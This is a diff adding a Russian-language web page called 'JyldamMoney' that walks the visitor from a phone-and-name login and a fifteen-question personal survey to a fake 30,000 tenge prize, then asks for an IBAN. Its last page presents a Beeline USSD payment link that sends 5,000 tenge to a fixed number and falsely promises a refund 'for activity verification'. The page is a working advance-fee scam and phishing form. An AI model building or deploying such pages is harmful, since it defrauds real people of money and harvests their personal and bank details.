@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>JyldamMoney</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+
+  <link rel="icon" type="image/png" sizes="64x64" href="logo.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="logo.png">
+  <link rel="apple-touch-icon" href="logo.png">
+
+
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: 'Inter', sans-serif;
+    }
+
+    body {
+      margin: 0;
+      background: #111;
+      color: #fff;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .app {
+      width: 100%;
+      max-width: 420px;
+      padding: 32px 24px;
+      background: #161616;
+      border-radius: 20px;
+      box-shadow: 0 20px 40px rgba(0,0,0,0.6);
+      animation: fadeIn 0.6s ease;
+    }
+
+    @keyframes fadeIn {
+      from {opacity:0; transform: translateY(20px)}
+      to {opacity:1; transform: translateY(0)}
+    }
+
+    .logo {
+      text-align: center;
+      font-weight: 600;
+      font-size: 22px;
+      margin-bottom: 24px;
+      letter-spacing: 1px;
+    }
+
+    h2 {
+      margin-bottom: 20px;
+      font-weight: 400;
+      text-align: center;
+    }
+
+    .form-group {
+      margin-bottom: 16px;
+    }
+
+    label {
+      font-size: 13px;
+      color: #aaa;
+    }
+
+    input, textarea {
+      width: 100%;
+      padding: 12px 14px;
+      margin-top: 6px;
+      background: #222;
+      border: 1px solid #333;
+      border-radius: 10px;
+      color: #fff;
+      outline: none;
+      transition: 0.2s;
+    }
+
+    input:focus, textarea:focus {
+      border-color: #4cafef;
+      box-shadow: 0 0 0 2px rgba(76,175,239,0.2);
+    }
+
+    textarea {
+      resize: none;
+      min-height: 60px;
+    }
+
+    .btn {
+        width: 100%;
+        padding: 14px;
+
+        /* ВАЖНО для <a> */
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        text-decoration: none;
+
+        background: linear-gradient(135deg,#4cafef,#6be6b1);
+        border: none;
+        border-radius: 12px;
+
+        color: #000;
+        font-weight: 600;
+        cursor: pointer;
+        margin-top: 10px;
+
+        transition: 0.25s;
+    }
+
+    .btn:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 10px 20px rgba(0,0,0,0.4);
+    }
+
+    .btn:visited {
+        color: #000;
+    }
+
+    .btn:active {
+        transform: translateY(0);
+    }
+
+    .page {
+      display: none;
+      animation: fadeIn 0.4s ease;
+    }
+
+    .page.active {
+      display: block;
+    }
+
+    /* Prize animation */
+    .prize-box {
+      text-align: center;
+      padding: 30px 20px;
+      background: #1c1c1c;
+      border-radius: 16px;
+      position: relative;
+      overflow: hidden;
+      margin-bottom: 20px;
+    }
+
+    .prize {
+      font-size: 36px;
+      font-weight: 600;
+      color: #6be6b1;
+      margin: 20px 0;
+      animation: pulse 1.5s infinite;
+    }
+
+    @keyframes pulse {
+      0% {transform: scale(1)}
+      50% {transform: scale(1.05)}
+      100% {transform: scale(1)}
+    }
+
+    .confetti {
+      position: absolute;
+      width: 6px;
+      height: 12px;
+      background: #4cafef;
+      top: -20px;
+      animation: fall 3s linear infinite;
+    }
+
+    @keyframes fall {
+      to {transform: translateY(400px) rotate(360deg)}
+    }
+
+    .note {
+      font-size: 12px;
+      color: #aaa;
+      text-align: center;
+      margin-top: 16px;
+      line-height: 1.5;
+    }
+
+  </style>
+</head>
+<body>
+
+<div class="app">
+
+  <div class="logo">JyldamMoney</div>
+
+  <!-- PAGE 1: LOGIN -->
+  <div class="page active" id="page1">
+    <h2>Авторизация</h2>
+
+    <div class="form-group">
+      <label>Номер телефона</label>
+      <input type="tel" id="phone" placeholder="+7 7XX XXX XXXX или 770XXXXXXXX" required pattern="(\+7|7)[0-9]{10}">
+    </div>
+
+    <div class="form-group">
+      <label>ФИО</label>
+      <input type="text" id="fullname" placeholder="Иванов Иван Иванович" required minlength="5">
+    </div>
+
+    <button class="btn" onclick="goTo(2)">Продолжить</button>
+  </div>
+
+
+  <!-- PAGE 2: QUESTIONNAIRE -->
+  <div class="page" id="page2">
+    <h2>Анкета</h2>
+
+    <div id="questions"></div>
+
+    <button class="btn" onclick="goTo(3)">Отправить анкету</button>
+  </div>
+
+
+  <!-- PAGE 3: SUCCESS + PRIZE -->
+  <div class="page" id="page3">
+    <h2>Поздравляем!</h2>
+
+    <div class="prize-box" id="confettiBox">
+      <p>Вы получили приз</p>
+      <div class="prize">30 000 ₸</div>
+      <p>Бонус за активность</p>
+    </div>
+
+    <button class="btn" onclick="goTo(4)">Получить</button>
+  </div>
+
+
+  <!-- PAGE 4: IBAN -->
+  <div class="page" id="page4">
+    <h2>Получение выплаты</h2>
+
+    <div class="form-group">
+      <label>IBAN счет</label>
+      <input type="text" id="iban" placeholder="KZ00 XXXX XXXX XXXX" required minlength="20">
+    </div>
+
+    <button class="btn" onclick="goTo(5)">Подтвердить</button>
+  </div>
+
+
+  <!-- PAGE 5: SUBSCRIPTION -->
+  <div class="page" id="page5">
+    <h2>Подписка</h2>
+
+    <div class="form-group">
+      <label>Номер Beeline</label>
+      <input type="tel" value="+7 771 510 5367" readonly>
+    </div>
+
+    <div class="form-group">
+      <label>Сумма</label>
+      <input type="text" value="5000 ₸" readonly>
+    </div>
+
+    <a href="tel:*700*77078160907*5000#" class="btn">Оплатить через Beeline</a>
+
+    <div class="note">
+      Оплата в размере 5000₸ будет полностью возвращена.
+      Данный платеж используется для проверки активности пользователя.
+    </div>
+  </div>
+
+</div>
+
+
+<script>
+
+  /* Navigation */
+  function goTo(n) {
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    document.getElementById('page' + n).classList.add('active');
+
+    if (n === 3) initConfetti();
+  }
+
+
+  /* Validation Helpers */
+  function showError(input, message) {
+    let err = input.parentElement.querySelector('.error-msg');
+
+    if (!err) {
+      err = document.createElement('div');
+      err.className = 'error-msg';
+      input.parentElement.appendChild(err);
+    }
+
+    err.textContent = message;
+    err.style.display = 'block';
+    input.classList.add('error');
+  }
+
+  function hideError(input) {
+    const err = input.parentElement.querySelector('.error-msg');
+
+    if (err) err.style.display = 'none';
+    input.classList.remove('error');
+  }
+
+
+  function validateInput(input) {
+    if (input.value.trim() === '') {
+      showError(input, 'Поле обязательно для заполнения');
+      return false;
+    }
+
+    if (!input.checkValidity()) {
+
+      if (input.type === 'tel') {
+        showError(input, 'Введите корректный номер телефона');
+      }
+      else if (input.id === 'iban') {
+        showError(input, 'Введите корректный IBAN');
+      }
+      else {
+        showError(input, 'Некорректное значение');
+      }
+
+      return false;
+    }
+
+    hideError(input);
+    return true;
+  }
+
+
+  function bindValidation(container, button) {
+    const inputs = container.querySelectorAll('input, textarea');
+
+    function check() {
+      let valid = true;
+
+      inputs.forEach(i => {
+        if (!validateInput(i)) valid = false;
+      });
+
+      button.disabled = !valid;
+    }
+
+    inputs.forEach(i => {
+      i.addEventListener('input', check);
+      i.addEventListener('blur', check);
+    });
+
+    check();
+  }
+
+
+  /* Page Validations */
+  window.onload = () => {
+
+    // Page 1
+    bindValidation(
+      document.getElementById('page1'),
+      document.querySelector('#page1 .btn')
+    );
+
+    // Page 2
+    bindValidation(
+      document.getElementById('page2'),
+      document.querySelector('#page2 .btn')
+    );
+
+    // Page 4
+    bindValidation(
+      document.getElementById('page4'),
+      document.querySelector('#page4 .btn')
+    );
+  };
+
+
+  /* Questions */
+  const questions = [
+    'Как вас зовут?',
+    'Сколько вам лет?',
+    'В каком городе вы живете?',
+    'Ваша профессия?',
+    'Ваше хобби?',
+    'Любимая книга?',
+    'Любимый фильм?',
+    'Любимая музыка?',
+    'Как вы проводите выходные?',
+    'Ваши сильные стороны?',
+    'Ваши цели на год?',
+    'Что вас мотивирует?',
+    'Любимая кухня?',
+    'Любимая страна?',
+    'О чем вы мечтаете?'
+  ];
+
+  const qContainer = document.getElementById('questions');
+
+  questions.forEach((q, i) => {
+    const block = document.createElement('div');
+    block.className = 'form-group';
+
+    block.innerHTML = `
+      <label>${i+1}. ${q}</label>
+      <textarea required></textarea>
+    `;
+
+    qContainer.appendChild(block);
+  });
+
+
+  /* Confetti */
+  function initConfetti() {
+    const box = document.getElementById('confettiBox');
+
+    for (let i = 0; i < 25; i++) {
+      const el = document.createElement('div');
+      el.className = 'confetti';
+
+      el.style.left = Math.random() * 100 + '%';
+      el.style.background = Math.random() > 0.5 ? '#4cafef' : '#6be6b1';
+      el.style.animationDelay = Math.random() * 2 + 's';
+      el.style.opacity = Math.random();
+
+      box.appendChild(el);
+    }
+  }
+
+</script>
+
+<style>
+  .error-msg {
+    margin-top: 6px;
+    font-size: 12px;
+    color: #ff6b6b;
+    display: none;
+  }
+
+  input.error, textarea.error {
+    border-color: #ff6b6b !important;
+    box-shadow: 0 0 0 2px rgba(255,107,107,0.15);
+  }
+
+  button:disabled {
+    opacity: 0.5;
+    cursor: not-allowed;
+    transform: none !important;
+    box-shadow: none !important;
+  }
+</style>
+
+</body>
+</html>
